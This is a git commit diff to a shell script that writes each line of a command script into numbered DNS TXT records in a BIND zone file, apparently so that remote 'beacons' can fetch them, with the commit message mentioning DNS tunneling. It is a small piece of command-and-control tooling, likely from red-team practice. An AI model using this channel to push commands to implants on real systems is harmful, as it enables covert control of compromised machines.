8e18d157bf10e4065a0b68f3d00ccbd2586ba525
Doshmajhan <cpc1007@g.rit.edu>
2016-03-17 00:32:51 +0000

    Have makeshift deploy script by writing commands to TXT records. Working on DNS Tunneling

--- deploy.sh
+++ deploy.sh
@@ -2,6 +2,12 @@
 # Takes script and deploys it to the beacons
 # Author - Doshmajhan
 
+# Reset file for new commands
+sed -i '11,/-End/d' /etc/bind/dosh.cloud
+
+# Loop through script and create TXT records for each command
+x=1
 while read LINE; do
-    echo $LINE
+    echo "$x       IN  TXT \"$LINE\"" >> /etc/bind/dosh.cloud
+    let x=x+1
 done
